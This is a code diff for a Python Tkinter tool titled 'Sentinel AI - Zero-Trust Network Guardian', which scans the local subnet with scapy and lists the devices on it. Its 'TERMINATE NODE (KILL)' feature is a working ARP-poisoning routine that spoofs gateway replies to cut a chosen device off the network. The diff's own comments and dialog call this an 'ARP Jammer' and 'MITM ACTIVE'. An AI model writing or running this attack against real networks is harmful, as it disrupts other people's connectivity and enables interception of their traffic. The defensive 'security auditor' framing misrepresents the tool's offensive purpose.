@@ -8,62 +8,74 @@ import time
 class SentinelFinal:
     def __init__(self, root):
         self.root = root
-        self.root.title("Sentinel AI - Professional Network Security Auditor")
-        self.root.geometry("1000x600")
+        self.root.title("Sentinel AI - Zero-Trust Network Guardian")
+        self.root.geometry("1000x650")
         self.root.configure(bg="#0a0a0a")
 
-        # Header
-        tk.Label(root, text="SENTINEL AI - NETWORK MONITOR", font=("Courier", 24, "bold"), bg="#0a0a0a", fg="#00ff00").pack(pady=20)
+        # Header Section
+        tk.Label(root, text="SENTINEL AI - ZERO TRUST MONITOR", font=("Courier", 24, "bold"), bg="#0a0a0a", fg="#00ff00").pack(pady=20)
 
-        # Input Frame
+        # Automatic IP Range Detection Logic
         input_frame = tk.Frame(root, bg="#0a0a0a")
         input_frame.pack(pady=5)
         
-        tk.Label(input_frame, text="Network Range:", font=("Arial", 12), bg="#0a0a0a", fg="white").pack(side=tk.LEFT)
-        self.ip_entry = tk.Entry(input_frame, font=("Arial", 12), width=22, bg="#1a1a1a", fg="white", insertbackground="white")
-        self.ip_entry.insert(0, "192.168.100.0/24")
+        tk.Label(input_frame, text="Current Network Range:", font=("Arial", 12), bg="#0a0a0a", fg="white").pack(side=tk.LEFT)
+        
+        self.ip_entry = tk.Entry(input_frame, font=("Arial", 12), width=25, bg="#1a1a1a", fg="#00ff00", insertbackground="white")
+        # Auto-Detect IP on startup
+        auto_ip = self.get_auto_ip_range()
+        self.ip_entry.insert(0, auto_ip)
         self.ip_entry.pack(side=tk.LEFT, padx=10)
 
-        # Updated Style for Table (Fix for your error)
+        # Professional Table Setup
         style = ttk.Style()
         style.theme_use("clam")
         style.configure("Treeview", background="#1a1a1a", foreground="white", fieldbackground="#1a1a1a", rowheight=35, font=("Arial", 10))
-        # Headings fix
         style.configure("Treeview.Heading", background="#333333", foreground="white", font=("Arial", 11, "bold"))
         style.map("Treeview", background=[('selected', '#00ff00')], foreground=[('selected', 'black')])
 
-        # Device Table Columns
-        self.tree = ttk.Treeview(root, columns=("IP", "MAC", "Device Hostname", "Security Status"), show="headings")
-        self.tree.heading("IP", text="IP ADDRESS")
+        self.tree = ttk.Treeview(root, columns=("IP", "MAC", "Hostname", "Security Status"), show="headings")
+        self.tree.heading("IP", text="NETWORK IP")
         self.tree.heading("MAC", text="MAC ADDRESS")
-        self.tree.heading("Device Hostname", text="DEVICE HOSTNAME")
-        self.tree.heading("Security Status", text="SECURITY STATUS")
+        self.tree.heading("Hostname", text="DEVICE IDENTIFIER")
+        self.tree.heading("Security Status", text="ZERO-TRUST STATUS")
         
-        for col in ("IP", "MAC", "Device Hostname", "Security Status"):
-            self.tree.column(col, width=220, anchor="center")
-            
+        for col in ("IP", "MAC", "Hostname", "Security Status"):
+            self.tree.column(col, width=240, anchor="center")
         self.tree.pack(pady=20, padx=20, fill="both", expand=True)
 
-        # Control Panel Buttons
+        # Action Buttons
         ctrl_frame = tk.Frame(root, bg="#0a0a0a")
         ctrl_frame.pack(pady=10)
 
-        tk.Button(ctrl_frame, text="DEEP SCAN NETWORK", font=("Arial", 11, "bold"), bg="#00ff00", width=25, height=2, command=self.start_scan).pack(side=tk.LEFT, padx=15)
+        tk.Button(ctrl_frame, text="START AUTO-SCAN", font=("Arial", 11, "bold"), bg="#00ff00", width=25, height=2, command=self.start_scan).pack(side=tk.LEFT, padx=15)
         tk.Button(ctrl_frame, text="TERMINATE NODE (KILL)", font=("Arial", 11, "bold"), bg="#ff0000", fg="white", width=25, height=2, command=self.start_kill).pack(side=tk.LEFT, padx=15)
 
-        self.status = tk.Label(root, text="System Ready | Waiting for User Command", bg="#0a0a0a", fg="#00ff00", font=("Arial", 10))
-        self.status.pack(side=tk.BOTTOM, fill="x", pady=5)
+        self.status = tk.Label(root, text="System: Operational | Ready for Deployment", bg="#0a0a0a", fg="#00ff00", font=("Arial", 10))
+        self.status.pack(side=tk.BOTTOM, fill="x", pady=10)
 
         self.killing = False
+
+    def get_auto_ip_range(self):
+        """Automatically detects the current network subnet"""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            local_ip = s.getsockname()[0]
+            s.close()
+            base_ip = local_ip.rsplit('.', 1)[0]
+            return f"{base_ip}.0/24"
+        except:
+            return "192.168.100.0/24" # Default fallback
 
     def get_hostname(self, ip):
         try:
             return socket.gethostbyaddr(ip)[0]
         except:
-            return "Encrypted/Mobile Node"
+            return "Mobile/Wireless Device"
 
     def scan_logic(self):
-        self.status.config(text="Scanning... Broadcasting ARP Packets", fg="yellow")
+        self.status.config(text="ANALYZING SUBNET: Broadcasting Discovery Packets...", fg="yellow")
         target_ip = self.ip_entry.get()
         
         try:
@@ -79,33 +91,35 @@ class SentinelFinal:
                 mac = rcv.hwsrc
                 name = self.get_hostname(ip)
                 
+                # Zero-Trust Labeling Logic
                 if ip.endswith(".1"):
                     sec_status = "GATEWAY (TRUSTED)"
-                elif "Hamad" in name or ip == "192.168.100.28": # Update if your PC IP changes
-                    sec_status = "ADMINISTRATOR (LOCAL)"
+                elif "Hamad" in name or "PC" in name.upper():
+                    sec_status = "ADMIN (AUTHORIZED)"
                 else:
-                    sec_status = "SECURE NODE"
+                    sec_status = "UNVERIFIED NODE"
                     
                 self.tree.insert("", tk.END, values=(ip, mac, name, sec_status))
             
-            self.status.config(text=f"Scan Complete: {len(answered)} Nodes Found", fg="#00ff00")
+            self.status.config(text=f"Scan Complete: {len(answered)} Nodes Identified on {target_ip}", fg="#00ff00")
         except Exception as e:
             messagebox.showerror("Error", f"Failed to scan: {e}")
 
     def kill_logic(self, target_ip, target_mac):
         gateway_ip = target_ip.rsplit('.', 1)[0] + '.1'
         self.killing = True
-        self.status.config(text=f"TERMINATING: Isolating {target_ip}...", fg="red")
+        self.status.config(text=f"MITM ACTIVE: Jamming Connection for {target_ip}...", fg="red")
         try:
-            for _ in range(60): 
+            for _ in range(60): # 30 seconds of disruption
                 if not self.killing: break
+                # ARP Poisoning Packets
                 p1 = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
                 p2 = scapy.ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip)
                 scapy.send(p1, verbose=False)
                 scapy.send(p2, verbose=False)
                 time.sleep(0.5)
         except: pass
-        self.status.config(text="System Ready", fg="#00ff00")
+        self.status.config(text="System Operational", fg="#00ff00")
         self.killing = False
 
     def start_scan(self): threading.Thread(target=self.scan_logic, daemon=True).start()
@@ -113,13 +127,15 @@ class SentinelFinal:
     def start_kill(self):
         selected = self.tree.selection()
         if not selected:
-            messagebox.showwarning("Warning", "Select a device first!")
+            messagebox.showwarning("System Alert", "Please select a target node first!")
             return
         ip, mac, _, status = self.tree.item(selected)['values']
         if "GATEWAY" in status:
-            messagebox.showerror("Error", "Cannot kill the Gateway!")
+            messagebox.showerror("Restricted", "Cannot terminate the primary Gateway!")
             return
-        threading.Thread(target=self.kill_logic, args=(ip, mac), daemon=True).start()
+        
+        if messagebox.askyesno("Confirm Attack", f"Trigger ARP Jammer on {ip}?"):
+            threading.Thread(target=self.kill_logic, args=(ip, mac), daemon=True).start()
 
 if __name__ == "__main__":
     root = tk.Tk()
